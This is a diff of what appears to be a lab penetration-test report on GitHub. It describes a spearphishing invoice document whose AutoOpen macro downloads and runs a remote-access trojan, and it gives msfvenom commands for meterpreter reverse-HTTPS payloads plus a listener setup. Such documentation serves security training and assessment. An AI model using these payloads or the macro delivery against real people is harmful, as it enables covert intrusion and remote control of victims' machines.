@@ -17,6 +17,39 @@ NOTES:
 <img width="890" height="139" alt="image" src="https://github.com/user-attachments/assets/71141d52-0e1a-4c7d-9525-ff37611a40a9" />
 
 word macro below:
+
+
+
+
+
+## 1. Executive Summary
+
+The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.
+
+## 2. Methodology
+
+### Phase 1: Initial Access
+**Vector:** Spearphishing Attachment (VBA Macro)
+**Premise:** A macro-enabled Word document (.docm) was crafted to simulate a spearphishing attachment. The document impersonates a routine business invoice and was delivered to the target `Apollo`. Upon opening, the AutoOpen() macro executes automatically without requiring further user interaction. It then downloads and silently executes the RAT binary from the C2 server.
+
+<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
+
+**RAT & Listener Creation:**
+```bash
+# Payload Generation
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended
+
+# Listener Setup
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.92.136
+set LPORT 14000
+exploit -j
+```
+
+**Macro Creation:**
+
 ```
 Sub AutoOpen()
     Dim strPath As String
@@ -39,45 +72,23 @@ Sub AutoOpen()
 End Sub
 ```
 
-
-
-
-## 1. Executive Summary
-
-The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.
-
-## 2. Methodology
-
-### Phase 1: Initial Access
-**Vector:** Spearphishing Attachment (VBA Macro)
-**Premise:** A malicious PDF disguised as an invoice was delivered to the target user.
-
-<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
-
-**Commands Used:**
-```bash
-# Payload Generation
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended
-
-# Listener Setup
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set LHOST 192.168.92.136
-set LPORT 14000
-exploit -j
-```
-
 **Session Output Analysis:**
 Upon execution, the following session was established:
 
 <img width="1264" height="395" alt="image" src="https://github.com/user-attachments/assets/f2e08fbc-c4a8-41d7-b8e2-f03bb09fc1bd" />
 
-<img width="458" height="167" alt="image" src="https://github.com/user-attachments/assets/feb1c98b-1efd-4fd1-88ae-d4fdfcd46465" />
+<img width="328" height="38" alt="image" src="https://github.com/user-attachments/assets/8bfc558a-49bb-40e8-ae2c-b282924b4300" />
 
 *   **ID:** Unique identifier for the session.
 *   **Type:** `meterpreter` indicates full-featured agent connection.
-*   **User:** `DESKTOP-H53BPAA\Apollo` confirms initial foothold as standard user.
+*   **Information:** `DESKTOP-H53BPAA\Apollo @ DESKTOP-H53BPAA` confirms initial foothold as standard user.
+
+
+
+
+
+
+
 
 ### Phase 2: Enumeration
 **Modules Executed:**
